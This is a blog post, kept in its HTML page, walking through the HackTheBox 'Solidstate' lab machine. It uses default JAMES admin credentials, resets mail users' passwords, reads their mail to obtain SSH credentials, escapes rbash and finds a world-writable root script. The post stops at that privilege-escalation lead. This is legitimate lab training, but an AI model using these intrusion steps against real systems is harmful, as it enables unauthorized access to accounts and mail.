@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://images.atsud0.me/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://images.atsud0.me/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://images.atsud0.me/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="https://images.atsud0.me/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"atsud0.me","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Solidstate.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Solidstate">
+<meta property="og:url" content="http://atsud0.me/2021/04/15/HackTheBox-Solidstate/index.html">
+<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
+<meta property="og:description" content="Solidstate.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://images.atsud0.me/images/post/20210415-15:23:08-_EE4ktP_EE4ktP_EE4ktP_wqlPZG.png">
+<meta property="article:published_time" content="2021-04-15T07:41:39.000Z">
+<meta property="article:modified_time" content="2021-04-15T14:04:21.910Z">
+<meta property="article:author" content="atsud0">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="POP3">
+<meta property="article:tag" content="Apache-JAMES">
+<meta property="article:tag" content="rbash">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images.atsud0.me/images/post/20210415-15:23:08-_EE4ktP_EE4ktP_EE4ktP_wqlPZG.png">
+
+<link rel="canonical" href="http://atsud0.me/2021/04/15/HackTheBox-Solidstate/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>HackTheBox-Solidstate | 雪之下二丁目鹤岗八幡宫</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163969429-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">雪之下二丁目鹤岗八幡宫</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">191</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">150</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://atsud0.me/2021/04/15/HackTheBox-Solidstate/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://images.atsud0.me/images/atsud0-avator.jpg">
+      <meta itemprop="name" content="atsud0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="雪之下二丁目鹤岗八幡宫">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HackTheBox-Solidstate
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-04-15 15:41:39 / Modified: 22:04:21" itemprop="dateCreated datePublished" datetime="2021-04-15T15:41:39+08:00">2021-04-15</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/" itemprop="url" rel="index"><span itemprop="name">靶机实验</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/HackTheBox/" itemprop="url" rel="index"><span itemprop="name">HackTheBox</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>7.3k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>7 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Solidstate.</p>
+<a id="more"></a>
+
+<h2 id="0x01信息收集"><a href="#0x01信息收集" class="headerlink" title="0x01信息收集"></a>0x01信息收集</h2><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- solidstate.htb</span><br><span class="line"></span><br><span class="line">SYN Stealth Scan Timing: About 0.49% done</span><br><span class="line">Nmap scan report for solidstate.htb (10.129.29.189)</span><br><span class="line">Host is up (0.26s latency).</span><br><span class="line">Not shown: 65529 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22&#x2F;tcp   open  ssh</span><br><span class="line">25&#x2F;tcp   open  smtp</span><br><span class="line">80&#x2F;tcp   open  http</span><br><span class="line">110&#x2F;tcp  open  pop3</span><br><span class="line">119&#x2F;tcp  open  nntp</span><br><span class="line">4555&#x2F;tcp open  rsip</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)</span><br><span class="line">|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)</span><br><span class="line">25&#x2F;tcp   open  smtp?</span><br><span class="line">|_smtp-commands: Couldn&#39;t establish connection on port 25</span><br><span class="line">80&#x2F;tcp   open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.25 (Debian)</span><br><span class="line">|_http-title: Home - Solid State Security</span><br><span class="line">110&#x2F;tcp  open  pop3?</span><br><span class="line">119&#x2F;tcp  open  nntp?</span><br><span class="line">4555&#x2F;tcp open  rsip?</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<h3 id="Port-25"><a href="#Port-25" class="headerlink" title="Port:25"></a>Port:25</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">└──╼ #nc -v solidstate.htb 25</span><br><span class="line">solidstate.htb [10.129.29.189] 25 (smtp) open</span><br><span class="line">220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Thu, 15 Apr 2021 02:07:51 -0400 (EDT)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Port-4555"><a href="#Port-4555" class="headerlink" title="Port:4555"></a>Port:4555</h3><p>The Port 4555 is JAMES Remote Administration Tool. So we can telent or nc this port.</p>
+<blockquote>
+<p>default username and password: root:root</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└──╼ #nc -v solidstate.htb 4555</span><br><span class="line">solidstate.htb [10.129.29.189] 4555 (?) open</span><br><span class="line">JAMES Remote Administration Tool 2.3.2</span><br><span class="line">Please enter your login and password</span><br><span class="line">Login id:</span><br><span class="line">root</span><br><span class="line">Password:</span><br><span class="line">root</span><br><span class="line">Welcome root. HELP for a list of commands</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">listusers</span><br><span class="line">Existing accounts 5</span><br><span class="line">user: james</span><br><span class="line">user: thomas</span><br><span class="line">user: john</span><br><span class="line">user: mindy</span><br><span class="line">user: mailadmin</span><br></pre></td></tr></table></figure>
+
+<h4 id="Reset-Password-amp-Login-POP3-Check-Mails"><a href="#Reset-Password-amp-Login-POP3-Check-Mails" class="headerlink" title="Reset Password &amp; Login POP3 Check Mails"></a>Reset Password &amp; Login POP3 Check Mails</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ nc -v solidstate.htb 4555</span><br><span class="line"></span><br><span class="line">setpassword james 123</span><br><span class="line">Password for james reset</span><br><span class="line">setpassword thomas 123</span><br><span class="line">Password for thomas reset</span><br><span class="line">setpassword john 123</span><br><span class="line">Password for john reset</span><br><span class="line">setpassword mindy 123</span><br><span class="line">Password for mindy reset</span><br><span class="line"></span><br><span class="line">quit</span><br><span class="line">Bye</span><br></pre></td></tr></table></figure>
+
+<h4 id="james"><a href="#james" class="headerlink" title="james"></a>james</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ telnet solidstate.htb 110</span><br><span class="line">Trying 10.129.29.189...</span><br><span class="line">Connected to solidstate.htb.</span><br><span class="line">Escape character is &#39;^]&#39;.</span><br><span class="line">+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready</span><br><span class="line">HELP</span><br><span class="line">-ERR</span><br><span class="line">USER james</span><br><span class="line">+OK</span><br><span class="line">PASS 123</span><br><span class="line">+OK Welcome james</span><br><span class="line">LIST</span><br><span class="line">+OK 0 0</span><br><span class="line">.</span><br><span class="line">LIST 1</span><br><span class="line">-ERR Message (1) does not exist.</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+<h4 id="thomas"><a href="#thomas" class="headerlink" title="thomas"></a>thomas</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">USER thomas</span><br><span class="line">+OK</span><br><span class="line">PASS 123</span><br><span class="line">+OK Welcome thomas</span><br><span class="line">LIST</span><br><span class="line">+OK 0 0</span><br><span class="line">.</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+
+<h4 id="john"><a href="#john" class="headerlink" title="john"></a>john</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">$ telnet solidstate.htb 110</span><br><span class="line">Trying 10.129.29.189...</span><br><span class="line">Connected to solidstate.htb.</span><br><span class="line">Escape character is &#39;^]&#39;.</span><br><span class="line">+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready</span><br><span class="line">USER john</span><br><span class="line">+OK</span><br><span class="line">PASS 123</span><br><span class="line">+OK Welcome john</span><br><span class="line">LIST</span><br><span class="line">+OK 1 743</span><br><span class="line">1 743</span><br><span class="line">.</span><br><span class="line">LIST 1</span><br><span class="line">+OK 1 743</span><br><span class="line">RETR 1</span><br><span class="line">+OK Message follows</span><br><span class="line">Return-Path: &lt;mailadmin@localhost&gt;</span><br><span class="line">Message-ID: &lt;9564574.1.1503422198108.JavaMail.root@solidstate&gt;</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;us-ascii</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line">Delivered-To: john@localhost</span><br><span class="line">Received: from 192.168.11.142 ([192.168.11.142])</span><br><span class="line">          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581</span><br><span class="line">          for &lt;john@localhost&gt;;</span><br><span class="line">          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)</span><br><span class="line">Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)</span><br><span class="line">From: mailadmin@localhost</span><br><span class="line">Subject: New Hires access</span><br><span class="line">John,</span><br><span class="line"></span><br><span class="line">Can you please restrict mindy&#39;s access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.</span><br><span class="line"></span><br><span class="line">Thank you in advance.</span><br><span class="line"></span><br><span class="line">Respectfully,</span><br><span class="line">James</span><br><span class="line"></span><br><span class="line">.</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>maybe The user mindy have something interesting ..</p>
+</blockquote>
+<h4 id="mindy"><a href="#mindy" class="headerlink" title="mindy"></a>mindy</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">$ telnet solidstate.htb 110</span><br><span class="line">Trying 10.129.29.189...</span><br><span class="line">Connected to solidstate.htb.</span><br><span class="line">Escape character is &#39;^]&#39;.</span><br><span class="line">+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready</span><br><span class="line">USER mindy</span><br><span class="line">+OK</span><br><span class="line">PASS 123</span><br><span class="line">+OK Welcome mindy</span><br><span class="line">LIST</span><br><span class="line">+OK 2 1945</span><br><span class="line">1 1109</span><br><span class="line">2 836</span><br><span class="line">.</span><br><span class="line">RETR 1</span><br><span class="line">+OK Message follows</span><br><span class="line">Return-Path: &lt;mailadmin@localhost&gt;</span><br><span class="line">Message-ID: &lt;5420213.0.1503422039826.JavaMail.root@solidstate&gt;</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;us-ascii</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line">Delivered-To: mindy@localhost</span><br><span class="line">Received: from 192.168.11.142 ([192.168.11.142])</span><br><span class="line">          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798</span><br><span class="line">          for &lt;mindy@localhost&gt;;</span><br><span class="line">          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)</span><br><span class="line">Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)</span><br><span class="line">From: mailadmin@localhost</span><br><span class="line">Subject: Welcome</span><br><span class="line"></span><br><span class="line">Dear Mindy,</span><br><span class="line">Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.</span><br><span class="line"></span><br><span class="line">We are looking forward to you joining our team and your success at Solid State Security.</span><br><span class="line"></span><br><span class="line">Respectfully,</span><br><span class="line">James</span><br><span class="line">.</span><br><span class="line">RETR 2</span><br><span class="line">+OK Message follows</span><br><span class="line">Return-Path: &lt;mailadmin@localhost&gt;</span><br><span class="line">Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt;</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;us-ascii</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line">Delivered-To: mindy@localhost</span><br><span class="line">Received: from 192.168.11.142 ([192.168.11.142])</span><br><span class="line">          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581</span><br><span class="line">          for &lt;mindy@localhost&gt;;</span><br><span class="line">          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)</span><br><span class="line">Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)</span><br><span class="line">From: mailadmin@localhost</span><br><span class="line">Subject: Your Access</span><br><span class="line"></span><br><span class="line">Dear Mindy,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Here are your ssh credentials to access the system. Remember to reset your password after your first login.</span><br><span class="line">Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.</span><br><span class="line"></span><br><span class="line">username: mindy</span><br><span class="line">pass: P@55W0rd1!2@</span><br><span class="line"></span><br><span class="line">Respectfully,</span><br><span class="line">James</span><br><span class="line"></span><br><span class="line">.</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>mindy:P@55W0rd1!2@<br>OK.we got the password. now let’s try to log ssh.</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ssh mindy@solidstate.htb</span><br><span class="line">mindy@solidstate.htb&#39;s password:</span><br><span class="line">Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU&#x2F;Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142</span><br><span class="line">mindy@solidstate:~$ id</span><br><span class="line">-rbash: id: command not found</span><br></pre></td></tr></table></figure>
+
+<p>rbash..dammit. but we can easy bypass.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssh mindy@solidstate.htb -t &#39;bash --noprofile&#39;</span><br><span class="line">mindy@solidstate.htb&#39;s password:</span><br><span class="line">$&#123;debian_chroot:+($debian_chroot)&#125;mindy@solidstate:~$ whoami</span><br><span class="line">mindy</span><br><span class="line">$&#123;debian_chroot:+($debian_chroot)&#125;mindy@solidstate:~$ id</span><br><span class="line">uid&#x3D;1001(mindy) gid&#x3D;1001(mindy) groups&#x3D;1001(mindy)</span><br></pre></td></tr></table></figure>
+
+<h3 id="exploit-id"><a href="#exploit-id" class="headerlink" title="exploit-id"></a>exploit-id</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit JAMES 2.3.2</span><br><span class="line"></span><br><span class="line">Apache James Server 2.3.2 - Insecure User Creation Arbitrary File  | linux&#x2F;remote&#x2F;48130.rb</span><br><span class="line">Apache James Server 2.3.2 - Remote Command Execution               | linux&#x2F;remote&#x2F;35513.py</span><br></pre></td></tr></table></figure>
+
+<p>we also could modfiy 35513.py paylod and then we could get the mindy bash shell too.</p>
+<h2 id="0x02-提权"><a href="#0x02-提权" class="headerlink" title="0x02 提权"></a>0x02 提权</h2><p>when we login mindy, i use linpeas help me enum system.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)</span><br><span class="line">[i] https:&#x2F;&#x2F;book.hacktricks.xyz&#x2F;linux-unix&#x2F;privilege-escalation#writable-files</span><br><span class="line">&#x2F;dev&#x2F;mqueue</span><br><span class="line">&#x2F;dev&#x2F;shm</span><br><span class="line">&#x2F;home&#x2F;mindy</span><br><span class="line">&#x2F;opt&#x2F;tmp.py</span><br></pre></td></tr></table></figure>
+
+<p>the /opt/tmp.py might be interesting</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$&#123;debian_chroot:+($debian_chroot)&#125;mindy@solidstate:~$ cat &#x2F;opt&#x2F;tmp.py</span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">try:</span><br><span class="line">     os.system(&#39;rm -r &#x2F;tmp&#x2F;* &#39;)</span><br><span class="line">except:</span><br><span class="line">     sys.exit()</span><br><span class="line"></span><br><span class="line">$&#123;debian_chroot:+($debian_chroot)&#125;mindy@solidstate:~$ ls -lah &#x2F;opt&#x2F;tmp.py</span><br><span class="line">-rwxrwxrwx 1 root root 105 Aug 22  2017 &#x2F;opt&#x2F;tmp.py</span><br></pre></td></tr></table></figure>
+
+<p>looks like we can modify this python script file.</p>
